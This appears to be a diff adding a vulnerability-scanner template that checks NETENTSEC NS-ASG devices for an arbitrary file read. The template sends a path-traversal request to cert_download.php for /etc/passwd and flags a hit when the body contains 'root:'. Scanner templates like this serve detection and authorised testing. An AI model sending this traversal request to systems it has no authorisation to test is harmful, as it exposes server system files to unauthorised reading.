@@ -1,0 +1,26 @@
+id: netentsec-ns-asg-file-read
+
+info:
+  name: NETENTSEC NS ASG File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    NETENTSEC-NS-ASG is vulnerable to a file read vulnerability that allows attackers to retrieve sensitive files from the server.
+  tags: file-read
+
+http:
+  - raw:
+      - |
+        GET /admin/cert_download.php?file=test.txt&certfile=../../../../../../../../etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
